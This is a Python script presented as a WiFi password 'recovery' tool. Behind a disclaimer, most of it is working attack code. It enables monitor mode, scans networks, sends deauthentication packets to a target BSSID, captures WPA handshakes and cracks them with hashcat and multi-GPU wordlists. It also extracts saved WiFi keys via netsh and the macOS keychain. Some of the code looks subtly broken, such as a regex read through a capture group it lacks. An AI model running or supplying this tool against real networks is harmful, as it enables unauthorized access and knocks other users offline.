#!/usr/bin/env python3
"""
WiFi Password Recovery Tool
===========================
A multi-platform tool for recovering forgotten WiFi passwords from your own devices.

DISCLAIMER: This tool is for educational purposes and authorized security testing only.
Use only on networks you own or have explicit written permission to test.
Unauthorized access to computer networks is illegal and unethical.

Methods:
1. WPA Handshake Capture & Hashcat Cracking (Linux/macOS/WSL)
2. Windows Saved Profile Extraction (PowerShell/CMD)
3. macOS Keychain Extraction (Terminal)
4. GPU-Accelerated Multi-GPU Cracking (All Platforms)
"""

import subprocess
import sys
import os
import re
import platform
import argparse
import json
import multiprocessing
from datetime import datetime
from pathlib import Path
from typing import List, Optional, Dict

# Import GPU engine (optional dependency)
try:
    from gpu_engine import GPUEngine, AdvancedWordlistGenerator
    GPU_AVAILABLE = True
except ImportError:
    GPU_AVAILABLE = False

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██╗    ██╗██╗███████╗██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗   ║
║   ██║    ██║██║██╔════╝██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║   ║
║   ██║ █╗ ██║██║█████╗  ██║    ███████╗██║     ███████║██╔██╗ ██║   ║
║   ██║███╗██║██║██╔══╝  ██║    ╚════██║██║     ██╔══██║██║╚██╗██║   ║
║   ╚███╔███╔╝██║███████╗██████╗███████╗╚██████╗██║  ██║██║ ╚████║   ║
║    ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝   ║
║                                                               ║
║   WiFi Password Recovery Tool v1.0                            ║
║   For Authorized Testing Only                                 ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
    print(banner)

def print_disclaimer():
    disclaimer = f"""
{Colors.YELLOW}{Colors.BOLD}⚠️  DISCLAIMER:{Colors.END}
{Colors.YELLOW}This tool is for educational purposes and authorized security testing only.
Use only on networks you own or have explicit written permission to test.
Unauthorized access to computer networks is illegal and unethical.{Colors.END}
"""
    print(disclaimer)

def run_command(cmd, shell=False):
    """Execute a command and return the output."""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            check=False,
            timeout=30
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {e}"

def check_dependencies():
    """Check if required tools are installed."""
    dependencies = {
        'airmon-ng': 'aircrack-ng package',
        'aireplay-ng': 'aircrack-ng package',
        'hashcat': 'hashcat',
        'netsh': 'Windows built-in',
        'security': 'macOS built-in'
    }
    
    print(f"{Colors.BLUE}[*] Checking dependencies...{Colors.END}")
    missing = []
    
    for tool, package in dependencies.items():
        if platform.system() == 'Windows' and tool in ['netsh']:
            continue
        elif platform.system() == 'Darwin' and tool in ['security']:
            continue
        elif platform.system() in ['Linux', 'Darwin'] and tool in ['airmon-ng', 'aireplay-ng', 'hashcat']:
            result = run_command(f"which {tool}")
            if 'not found' in result or 'Error' in result:
                missing.append(f"{tool} ({package})")
    
    if missing:
        print(f"{Colors.RED}[!] Missing dependencies:{Colors.END}")
        for dep in missing:
            print(f"    - {dep}")
        return False
    
    print(f"{Colors.GREEN}[✓] All dependencies found{Colors.END}")
    return True

class WPAHandshakeCracker:
    """Method 1: WPA Handshake Capture & Hashcat Cracking (Linux/macOS/WSL)"""
    
    def __init__(self, interface='wlan0', wordlist='wordlists/rockyou.txt', 
                 gpu_engine: 'GPUEngine' = None):
        self.interface = interface
        self.wordlist = wordlist
        self.monitor_interface = None
        self.capture_file = None
        self.gpu_engine = gpu_engine
        
    def enable_monitor_mode(self):
        """Put WiFi adapter into monitor mode."""
        print(f"\n{Colors.BLUE}[*] Enabling monitor mode on {self.interface}...{Colors.END}")
        
        result = run_command(f"sudo airmon-ng start {self.interface}")
        print(result)
        
        # Extract monitor interface name
        match = re.search(r'(\w+mon)\s+monitor', result)
        if match:
            self.monitor_interface = match.group(1)
            print(f"{Colors.GREEN}[✓] Monitor mode enabled on {self.monitor_interface}{Colors.END}")
            return True
        else:
            # Try common naming patterns
            self.monitor_interface = f"{self.interface}mon"
            print(f"{Colors.YELLOW}[!] Could not detect monitor interface, assuming {self.monitor_interface}{Colors.END}")
            return True
    
    def scan_networks(self):
        """Scan for available networks."""
        if not self.monitor_interface:
            print(f"{Colors.RED}[!] Monitor mode not enabled{Colors.END}")
            return None
            
        print(f"\n{Colors.BLUE}[*] Scanning for networks...{Colors.END}")
        result = run_command(f"sudo airodump-ng {self.monitor_interface} --write /tmp/scan_results --output-format csv")
        
        print(f"{Colors.GREEN}[✓] Scan results saved to /tmp/scan_results.csv{Colors.END}")
        return result
    
    def capture_handshake(self, target_bssid, target_channel):
        """Capture WPA handshake from target network."""
        if not self.monitor_interface:
            print(f"{Colors.RED}[!] Monitor mode not enabled{Colors.END}")
            return None
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.capture_file = f"captures/handshake_{timestamp}.cap"
        
        print(f"\n{Colors.BLUE}[*] Capturing handshake from {target_bssid}...{Colors.END}")
        print(f"{Colors.YELLOW}[*] This may take a while. Press Ctrl+C to stop.{Colors.END}")
        
        # Set channel
        run_command(f"sudo iwconfig {self.monitor_interface} channel {target_channel}")
        
        # Start capture
        cmd = f"sudo airodump-ng -c {target_channel} --bssid {target_bssid} -w {self.capture_file} {self.monitor_interface}"
        print(f"{Colors.CYAN}[>] Running: {cmd}{Colors.END}")
        result = run_command(cmd)
        
        if os.path.exists(self.capture_file):
            print(f"{Colors.GREEN}[✓] Handshake captured: {self.capture_file}{Colors.END}")
            return self.capture_file
        else:
            print(f"{Colors.RED}[!] Failed to capture handshake{Colors.END}")
            return None
    
    def deauth_client(self, target_bssid, client_mac=None):
        """Send deauthentication packets to force handshake."""
        if not self.monitor_interface:
            print(f"{Colors.RED}[!] Monitor mode not enabled{Colors.END}")
            return
            
        print(f"\n{Colors.BLUE}[*] Sending deauth packets...{Colors.END}")
        
        if client_mac:
            cmd = f"sudo aireplay-ng -0 5 -c {client_mac} -a {target_bssid} {self.monitor_interface}"
        else:
            cmd = f"sudo aireplay-ng -0 5 -a {target_bssid} {self.monitor_interface}"
            
        result = run_command(cmd)
        print(result)
    
    def crack_with_hashcat(self, cap_file=None, parallel=False, gpu_count=None, 
                          rules: List[str] = None):
        """Crack captured handshake using Hashcat with optional GPU acceleration."""
        if cap_file:
            self.capture_file = cap_file
            
        if not self.capture_file or not os.path.exists(self.capture_file):
            print(f"{Colors.RED}[!] No capture file found{Colors.END}")
            return None
            
        if not os.path.exists(self.wordlist):
            print(f"{Colors.RED}[!] Wordlist not found: {self.wordlist}{Colors.END}")
            print(f"{Colors.YELLOW}[*] Download a wordlist and place it in {self.wordlist}{Colors.END}")
            return None
            
        # Convert cap to hc22000 format for hashcat
        hccapx_file = self.capture_file.replace('.cap', '.hc22000')
        run_command(f"cap2hc22000 {self.capture_file} > {hccapx_file}")
        
        if not os.path.exists(hccapx_file):
            print(f"{Colors.RED}[!] Failed to convert capture file{Colors.END}")
            return None
        
        print(f"\n{Colors.BLUE}[*] Cracking handshake with Hashcat...{Colors.END}")
        print(f"{Colors.CYAN}[*] Capture: {self.capture_file}{Colors.END}")
        print(f"{Colors.CYAN}[*] Wordlist: {self.wordlist}{Colors.END}")
        
        # GPU-accelerated parallel cracking
        if parallel and self.gpu_engine and GPU_AVAILABLE:
            return self._crack_parallel(hccapx_file, gpu_count, rules)
        else:
            return self._crack_single(hccapx_file, rules)
    
    def _crack_single(self, hccapx_file: str, rules: List[str] = None) -> Optional[str]:
        """Single GPU/CPU cracking."""
        cmd = ["hashcat", "-m", "22000", "-a", "0", "-w", "3", "--force"]
        
        if rules:
            for rule in rules:
                cmd.extend(["-r", rule])
        
        cmd.extend([hccapx_file, self.wordlist])
        
        print(f"{Colors.CYAN}[>] Running: {' '.join(cmd)}{Colors.END}")
        result = run_command(cmd)
        
        print(result)
        
        return self._extract_password(result)
    
    def _crack_parallel(self, hccapx_file: str, gpu_count: int = None, 
                       rules: List[str] = None) -> Optional[str]:
        """Multi-GPU parallel cracking."""
        print(f"\n{Colors.BLUE}[*] Launching parallel GPU attack...{Colors.END}")
        
        # Detect GPUs if not specified
        if not gpu_count:
            gpu_count = self.gpu_engine.get_gpu_count()
        
        if gpu_count == 0:
            print(f"{Colors.YELLOW}[!] No GPUs detected, falling back to CPU{Colors.END}")
            return self._crack_single(hccapx_file, rules)
        
        print(f"{Colors.GREEN}[✓] Using {gpu_count} GPUs{Colors.END}")
        
        # Split wordlist
        chunk_files = self.gpu_engine.split_wordlist(self.wordlist, gpu_count)
        
        # Launch parallel processes
        processes = []
        gpu_ids = self.gpu_engine.get_gpu_ids()
        
        for i in range(gpu_count):
            gpu_id = gpu_ids[i] if i < len(gpu_ids) else i
            
            cmd = self.gpu_engine.build_hashcat_command(
                hash_file=hccapx_file,
                wordlist=chunk_files[i],
                hash_mode=22000,
                gpu_ids=[gpu_id],
                rules=rules
            )
            
            print(f"{Colors.CYAN}[*] Worker {i}: GPU {gpu_id}{Colors.END}")
            
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            processes.append((proc, chunk_files[i]))
        
        # Monitor processes
        print(f"\n{Colors.YELLOW}[*] Monitoring {gpu_count} parallel workers...{Colors.END}")
        print(f"{Colors.YELLOW}[*] Press Ctrl+C to stop all workers{Colors.END}\n")
        
        try:
            password = self._monitor_parallel_processes(processes)
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Stopping all workers...{Colors.END}")
            self.gpu_engine.stop_all([p for p, _ in processes])
            password = None
        finally:
            # Cleanup
            self.gpu_engine.cleanup_chunks(chunk_files)
        
        return password
    
    def _monitor_parallel_processes(self, processes: list) -> Optional[str]:
        """Monitor parallel hashcat processes and extract password."""
        import time
        
        active_processes = list(processes)
        found_password = None
        
        while active_processes:
            for i, (proc, chunk_file) in enumerate(active_processes[:]):
                poll = proc.poll()
                
                if poll is not None:
                    # Process finished
                    stdout, stderr = proc.communicate()
                    
                    if poll == 0:
                        # Check for password in output
                        password = self._extract_password(stdout + stderr)
                        if password:
                            print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] PASSWORD FOUND on GPU {i}: {password}{Colors.END}")
                            found_password = password
                            
                            # Stop all other processes
                            for other_proc, _ in active_processes:
                                if other_proc != proc:
                                    other_proc.terminate()
                            
                            return password
                    else:
                        print(f"{Colors.RED}[!] Worker {i} failed with code {poll}{Colors.END}")
                    
                    active_processes.remove((proc, chunk_file))
            
            if active_processes:
                time.sleep(1)
        
        if not found_password:
            print(f"{Colors.YELLOW}[!] Password not found in any GPU worker{Colors.END}")
        
        return found_password
    
    def _extract_password(self, output: str) -> Optional[str]:
        """Extract cracked password from hashcat output."""
        patterns = [
            r'^[a-f0-9]+:(.+)$',
            r'(?<=:)[^\s:]+(?=\s*$)',
        ]
        
        for line in output.split('\n'):
            for pattern in patterns:
                match = re.search(pattern, line)
                if match:
                    return match.group(1).strip()
        
        return None
    
    def disable_monitor_mode(self):
        """Disable monitor mode and restore managed mode."""
        if self.monitor_interface:
            print(f"\n{Colors.BLUE}[*] Disabling monitor mode...{Colors.END}")
            run_command(f"sudo airmon-ng stop {self.monitor_interface}")
            print(f"{Colors.GREEN}[✓] Monitor mode disabled{Colors.END}")

class WindowsProfileExtractor:
    """Method 2: Windows Saved Profile Extraction (PowerShell/CMD)"""
    
    def __init__(self):
        self.profiles = []
        
    def get_profiles(self):
        """Get list of all saved WiFi profiles."""
        print(f"\n{Colors.BLUE}[*] Retrieving saved WiFi profiles...{Colors.END}")
        
        result = run_command("netsh wlan show profiles")
        
        # Extract profile names
        matches = re.findall(r'All User Profile\s*:\s*(.+)', result)
        if not matches:
            matches = re.findall(r'Profile\s*:\s*(.+)', result)
            
        self.profiles = [p.strip() for p in matches]
        
        if self.profiles:
            print(f"{Colors.GREEN}[✓] Found {len(self.profiles)} profiles:{Colors.END}")
            for i, profile in enumerate(self.profiles, 1):
                print(f"    {i}. {profile}")
        else:
            print(f"{Colors.YELLOW}[!] No profiles found{Colors.END}")
            
        return self.profiles
    
    def get_password(self, profile_name):
        """Get password for a specific profile."""
        print(f"\n{Colors.BLUE}[*] Extracting password for: {profile_name}{Colors.END}")
        
        result = run_command(f'netsh wlan show profile name="{profile_name}" key=clear')
        
        # Extract key content
        key_match = re.search(r'Key Content\s*:\s*(.+)', result)
        if key_match:
            password = key_match.group(1).strip()
            print(f"{Colors.GREEN}[✓] Password found: {password}{Colors.END}")
            return password
        else:
            print(f"{Colors.YELLOW}[!] No password found (network may use no authentication){Colors.END}")
            return None
    
    def extract_all(self):
        """Extract passwords for all saved profiles."""
        if not self.profiles:
            self.get_profiles()
            
        results = {}
        for profile in self.profiles:
            password = self.get_password(profile)
            results[profile] = password
            
        return results
    
    def export_to_file(self, filename='wifi_passwords.json'):
        """Export all extracted passwords to a JSON file."""
        results = self.extract_all()
        
        output = {
            'timestamp': datetime.now().isoformat(),
            'profiles': results
        }
        
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
            
        print(f"\n{Colors.GREEN}[✓] Results exported to {filename}{Colors.END}")
        return output

class MacOSKeychainExtractor:
    """Method 3: macOS Keychain Extraction"""
    
    def __init__(self):
        self.profiles = []
        
    def get_wifi_keychains(self):
        """Find WiFi-related keychain entries."""
        print(f"\n{Colors.BLUE}[*] Searching for WiFi keychain entries...{Colors.END}")
        
        # Search for airport/WiFi related entries
        result = run_command('security find-generic-password -l "WiFi" -g 2>&1')
        
        # Also search for specific patterns
        patterns = [
            'airport',
            'AirPort',
            'wifi',
            'WiFi',
            'WLAN'
        ]
        
        found = []
        for pattern in patterns:
            result = run_command(f'security find-generic-password -l "{pattern}" -g 2>&1')
            if 'password' in result.lower():
                found.append((pattern, result))
                
        return found
    
    def get_password_for_ssid(self, ssid):
        """Get password for a specific SSID from keychain."""
        print(f"\n{Colors.BLUE}[*] Searching keychain for: {ssid}{Colors.END}")
        
        # Try different search patterns
        patterns = [
            f'{ssid}',
            f'{ssid}@airport',
            f'WiFi-{ssid}',
            f'{ssid}-password'
        ]
        
        for pattern in patterns:
            result = run_command(f'security find-generic-password -l "{pattern}" -g 2>&1')
            
            # Extract password from output
            password_match = re.search(r'"v_Data"<blob>="(.+?)"', result)
            if password_match:
                password = password_match.group(1)
                print(f"{Colors.GREEN}[✓] Password found: {password}{Colors.END}")
                return password
                
            # Try alternate format
            password_match = re.search(r'password: "(.+?)"', result)
            if password_match:
                password = password_match.group(1)
                print(f"{Colors.GREEN}[✓] Password found: {password}{Colors.END}")
                return password
        
        print(f"{Colors.YELLOW}[!] No password found for {ssid}{Colors.END}")
        return None
    
    def list_all_wifi_passwords(self):
        """List all stored WiFi passwords."""
        print(f"\n{Colors.BLUE}[*] Listing all stored WiFi passwords...{Colors.END}")
        
        # Use security command to dump keychain
        result = run_command('security dump-keychain 2>&1 | grep -A 5 -i "wifi|airport|wlan"')
        
        print(f"{Colors.CYAN}{result}{Colors.END}")
        return result

class AdvancedWordlistManager:
    """Manage advanced wordlist generation and optimization."""
    
    def __init__(self):
        self.generator = None
        if GPU_AVAILABLE:
            self.generator = AdvancedWordlistGenerator()
    
    def generate_with_rules(self, input_wordlist: str, output_wordlist: str, 
                           rules: List[str] = None) -> str:
        """Generate wordlist using hashcat rules."""
        if not self.generator:
            print(f"{Colors.RED}[!] Advanced wordlist generator not available{Colors.END}")
            return input_wordlist
        
        print(f"\n{Colors.BLUE}[*] Generating advanced wordlist with rules...{Colors.END}")
        
        try:
            result = self.generator.generate_with_rules(
                input_wordlist, output_wordlist, rules
            )
            print(f"{Colors.GREEN}[✓] Generated: {result}{Colors.END}")
            return result
        except Exception as e:
            print(f"{Colors.RED}[!] Generation failed: {e}{Colors.END}")
            return input_wordlist
    
    def optimize_for_ram(self, wordlist: str, max_ram_mb: int = 500) -> str:
        """Optimize wordlist for limited RAM."""
        print(f"\n{Colors.BLUE}[*] Optimizing wordlist for {max_ram_mb}MB RAM...{Colors.END}")
        
        output_file = wordlist + ".optimized"
        
        # Read and deduplicate
        seen = set()
        words = []
        
        with open(wordlist, 'r', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if word and word not in seen:
                    seen.add(word)
                    words.append(word)
        
        # Check size
        estimated_mb = len(words) * 20 / (1024 * 1024)
        
        if estimated_mb > max_ram_mb:
            max_words = int(max_ram_mb * 1024 * 1024 / 20)
            words = words[:max_words]
            print(f"{Colors.YELLOW}[*] Truncated to {max_words} words{Colors.END}")
        
        # Write optimized wordlist
        with open(output_file, 'w') as f:
            for word in sorted(words):
                f.write(word + '\n')
        
        print(f"{Colors.GREEN}[✓] Optimized: {output_file}{Colors.END}")
        return output_file
    
    def split_for_gpus(self, wordlist: str, gpu_count: int) -> List[str]:
        """Split wordlist for parallel GPU processing."""
        if not self.generator:
            print(f"{Colors.RED}[!] GPU engine not available{Colors.END}")
            return [wordlist]
        
        print(f"\n{Colors.BLUE}[*] Splitting wordlist for {gpu_count} GPUs...{Colors.END}")
        
        try:
            from gpu_engine import GPUEngine
            engine = GPUEngine()
            chunks = engine.split_wordlist(wordlist, gpu_count)
            print(f"{Colors.GREEN}[✓] Created {len(chunks)} chunks{Colors.END}")
            return chunks
        except Exception as e:
            print(f"{Colors.RED}[!] Split failed: {e}{Colors.END}")
            return [wordlist]

def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description='WiFi Password Recovery Tool with GPU Acceleration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Linux/macOS - Capture and crack WPA handshake
  python wifi_cracker.py wpa --interface wlan0 --wordlist wordlists/rockyou.txt
  
  # Windows - Extract saved profiles
  python wifi_cracker.py windows
  
  # macOS - Extract from keychain
  python wifi_cracker.py macos --ssid MyNetwork
  
  # GPU-Accelerated cracking (4 GPUs)
  python wifi_cracker.py wpa --capture handshake.cap --parallel --gpu-count 4
  
  # Advanced wordlist generation
  python wifi_cracker.py wordlist --input rockyou.txt --rules --optimize 500
  
  # Detect GPUs
  python wifi_cracker.py gpu-detect
        """
    )
    
    subparsers = parser.add_subparsers(dest='method', help='Recovery method')
    
    # WPA Handshake method
    wpa_parser = subparsers.add_parser('wpa', help='WPA Handshake Capture & Crack')
    wpa_parser.add_argument('--interface', '-i', default='wlan0', help='WiFi interface (default: wlan0)')
    wpa_parser.add_argument('--wordlist', '-w', default='wordlists/rockyou.txt', help='Path to wordlist')
    wpa_parser.add_argument('--bssid', '-b', help='Target BSSID (MAC address)')
    wpa_parser.add_argument('--channel', '-c', type=int, help='Target channel')
    wpa_parser.add_argument('--capture', help='Existing capture file to crack')
    wpa_parser.add_argument('--deauth', action='store_true', help='Send deauth packets')
    wpa_parser.add_argument('--parallel', '-p', action='store_true', 
                           help='Enable parallel GPU cracking')
    wpa_parser.add_argument('--gpu-count', type=int, 
                           help='Number of GPUs to use (default: auto-detect)')
    wpa_parser.add_argument('--rules', nargs='+', 
                           help='Hashcat rule files (e.g., best64.rule)')
    
    # Windows method
    windows_parser = subparsers.add_parser('windows', help='Windows Saved Profile Extraction')
    windows_parser.add_argument('--ssid', help='Specific SSID to extract')
    windows_parser.add_argument('--export', '-e', action='store_true', help='Export to JSON file')
    
    # macOS method
    macos_parser = subparsers.add_parser('macos', help='macOS Keychain Extraction')
    macos_parser.add_argument('--ssid', '-s', help='Target SSID')
    macos_parser.add_argument('--list-all', '-l', action='store_true', help='List all WiFi keychains')
    
    # Wordlist management
    wordlist_parser = subparsers.add_parser('wordlist', help='Advanced Wordlist Management')
    wordlist_parser.add_argument('--input', '-i', required=True, help='Input wordlist')
    wordlist_parser.add_argument('--output', '-o', help='Output wordlist')
    wordlist_parser.add_argument('--rules', '-r', action='store_true', 
                                help='Generate with hashcat rules')
    wordlist_parser.add_argument('--optimize', type=int, metavar='MB',
                                help='Optimize for RAM limit (MB)')
    wordlist_parser.add_argument('--split', type=int, metavar='N',
                                help='Split for N GPUs')
    
    # GPU detection
    gpu_parser = subparsers.add_parser('gpu-detect', help='Detect GPUs')
    gpu_parser.add_argument('--hashcat', action='store_true', 
                           help='Test hashcat GPU detection')
    
    # Utility commands
    subparsers.add_parser('check', help='Check dependencies')
    subparsers.add_parser('banner', help='Show banner')
    
    args = parser.parse_args()
    
    # Always show banner and disclaimer
    print_banner()
    print_disclaimer()
    
    if args.method == 'banner':
        return
        
    if args.method == 'check':
        check_dependencies()
        return
    
    # GPU detection command
    if args.method == 'gpu-detect':
        detect_gpus(args.hashcat)
        return
    
    # Wordlist management command
    if args.method == 'wordlist':
        manage_wordlists(args)
        return
    
    # Check platform compatibility
    system = platform.system()
    
    # Initialize GPU engine if available
    gpu_engine = None
    if GPU_AVAILABLE and args.method == 'wpa':
        gpu_engine = GPUEngine()
        if args.parallel:
            print(f"{Colors.BLUE}[*] Initializing GPU engine...{Colors.END}")
            gpus = gpu_engine.detect_gpus()
            if gpus:
                print(f"{Colors.GREEN}[✓] Detected {len(gpus)} GPUs{Colors.END}")
                for gpu in gpus:
                    print(f"    - {gpu.name} ({gpu.memory}MB)")
            else:
                print(f"{Colors.YELLOW}[!] No GPUs detected{Colors.END}")
    
    if args.method == 'wpa':
        if system not in ['Linux', 'Darwin', 'Windows']:
            print(f"{Colors.RED}[!] WPA cracking is only supported on Linux/macOS/WSL/Windows{Colors.END}")
            return
            
        cracker = WPAHandshakeCracker(args.interface, args.wordlist, gpu_engine)
        
        if args.capture:
            # Just crack an existing capture file
            cracker.capture_file = args.capture
            cracker.crack_with_hashcat(
                parallel=args.parallel,
                gpu_count=args.gpu_count,
                rules=args.rules
            )
        else:
            # Full capture and crack workflow
            if system in ['Linux', 'Darwin']:
                if not check_dependencies():
                    return
                    
                cracker.enable_monitor_mode()
                
                if args.bssid and args.channel:
                    if args.deauth:
                        cracker.deauth_client(args.bssid)
                    cracker.capture_handshake(args.bssid, args.channel)
                    cracker.crack_with_hashcat(
                        parallel=args.parallel,
                        gpu_count=args.gpu_count,
                        rules=args.rules
                    )
                else:
                    print(f"{Colors.YELLOW}[*] Scanning for networks...{Colors.END}")
                    cracker.scan_networks()
                    print(f"\n{Colors.CYAN}Please identify target BSSID and channel from scan results{Colors.END}")
                    print(f"{Colors.CYAN}Then run again with --bssid and --channel flags{Colors.END}")
                
                cracker.disable_monitor_mode()
            else:
                print(f"{Colors.RED}[!] Full WPA capture requires Linux/macOS{Colors.END}")
                print(f"{Colors.YELLOW}[*] Use --capture with an existing .cap file{Colors.END}")
    
    elif args.method == 'windows':
        if system != 'Windows':
            print(f"{Colors.RED}[!] Windows method only works on Windows{Colors.END}")
            return
            
        extractor = WindowsProfileExtractor()
        
        if args.ssid:
            extractor.get_password(args.ssid)
        elif args.export:
            extractor.export_to_file()
        else:
            extractor.get_profiles()
            extractor.extract_all()
    
    elif args.method == 'macos':
        if system != 'Darwin':
            print(f"{Colors.RED}[!] macOS method only works on macOS{Colors.END}")
            return
            
        extractor = MacOSKeychainExtractor()
        
        if args.ssid:
            extractor.get_password_for_ssid(args.ssid)
        elif args.list_all:
            extractor.list_all_wifi_passwords()
        else:
            extractor.get_wifi_keychains()
    
    else:
        parser.print_help()

def detect_gpus(test_hashcat: bool = False):
    """Detect available GPUs."""
    print(f"\n{Colors.BLUE}[*] Detecting GPUs...{Colors.END}")
    
    if not GPU_AVAILABLE:
        print(f"{Colors.RED}[!] GPU engine not available{Colors.END}")
        print(f"{Colors.YELLOW}[*] Install gpu_engine.py module{Colors.END}")
        return
    
    engine = GPUEngine()
    gpus = engine.detect_gpus()
    
    if not gpus:
        print(f"{Colors.YELLOW}[!] No GPUs detected{Colors.END}")
    else:
        print(f"\n{Colors.GREEN}[✓] Detected {len(gpus)} GPU(s):{Colors.END}")
        for gpu in gpus:
            print(f"    [{gpu.id}] {gpu.name} ({gpu.vendor}) - {gpu.memory}MB")
    
    if test_hashcat:
        print(f"\n{Colors.BLUE}[*] Testing hashcat GPU detection...{Colors.END}")
        result = subprocess.run(
            [engine.hashcat_path, "-I"],
            capture_output=True,
            text=True
        )
        print(result.stdout)
        if result.stderr:
            print(f"{Colors.RED}{result.stderr}{Colors.END}")

def manage_wordlists(args):
    """Manage wordlist operations."""
    manager = AdvancedWordlistManager()
    
    input_file = args.input
    
    if not os.path.exists(input_file):
        print(f"{Colors.RED}[!] Input file not found: {input_file}{Colors.END}")
        return
    
    output_file = args.output or input_file
    
    if args.optimize:
        manager.optimize_for_ram(input_file, args.optimize)
    
    if args.rules:
        output_rules = output_file.replace('.txt', '_rules.txt')
        manager.generate_with_rules(input_file, output_rules)
    
    if args.split:
        manager.split_for_gpus(input_file, args.split)

if __name__ == '__main__':
    main()
